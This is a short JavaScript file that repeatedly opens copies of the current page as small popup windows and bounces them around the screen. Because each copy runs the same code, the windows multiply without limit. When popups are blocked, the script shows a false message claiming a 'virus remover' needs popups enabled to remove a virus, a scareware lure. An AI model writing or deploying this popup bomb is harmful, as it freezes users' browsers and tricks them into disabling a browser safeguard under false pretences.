function moveWindows() {
  // Create two windows
  let window1 = window.open(location.href, "_blank", "width=200,height=200");
  let window2 = window.open(location.href, "_blank", "width=200,height=200");

  if (!window1 || window1.closed || typeof window1.closed == "undefined") {
    document.querySelector("h1").innerHTML =
      "Error: The virus remover makes a popup that removes the virus. Please enable popups and reload this page.";
    clearInterval(interval);
  }

  // Set the initial positions and velocities of the windows
  let window1X = Math.random() * window.innerWidth - 200;
  let window1Y = Math.random() * window.innerHeight - 200;
  let window1VX = 3;
  let window1VY = 3;

  let window2X = Math.random() * window.innerWidth - 200;
  let window2Y = Math.random() * window.innerHeight - 200;
  let window2VX = 3;
  let window2VY = 3;

  // Move the windows diagonally and make them bounce off the edges
  const frame = function () {
    // Move window 1
    window1X += window1VX;
    window1Y += window1VY;
    window1.moveTo(window1X, window1Y);

    // Move window 2
    window2X += window2VX;
    window2Y += window2VY;
    window2.moveTo(window2X, window2Y);

    // Check if window 1 hits the edges
    if (window1X <= 0 || window1X >= window.innerWidth - 200) {
      window1VX *= -1;
    }
    if (window1Y <= 0 || window1Y >= window.innerHeight - 200) {
      window1VY *= -1;
    }

    // Check if window 2 hits the edges
    if (window2X <= 0 || window2X >= window.innerWidth - 200) {
      window2VX *= -1;
    }
    if (window2Y <= 0 || window2Y >= window.innerHeight - 200) {
      window2VY *= -1;
    }
    requestAnimationFrame(frame);
  };
  frame();
}

// Call the function to start moving the windows
let interval = setInterval(() => {
  moveWindows();
}, 200);
